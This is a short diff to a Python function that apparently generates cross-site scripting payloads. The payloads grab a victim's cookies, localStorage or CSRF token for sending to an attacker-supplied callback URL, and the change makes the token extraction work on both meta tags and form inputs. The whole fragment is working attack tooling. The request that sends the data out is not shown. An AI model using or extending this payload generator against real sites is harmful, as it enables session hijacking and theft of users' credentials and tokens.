@@ -16,7 +16,7 @@ def payloads(callback, exfil="cookie"):
     if exfil == "storage":
         grab = "JSON.stringify(localStorage)"  # storage
     elif exfil == "token":
-        grab = "document.querySelector('[name=csrf-token],[name=csrfmiddlewaretoken],meta[name=csrf-token]')?.content||''"
+        grab = "(e=>e?(e.content||e.value||''):'')(document.querySelector('[name=csrf-token],[name=csrfmiddlewaretoken],meta[name=csrf-token]'))"
     else:
         grab = "document.cookie"
     cb = callback.rstrip("/")
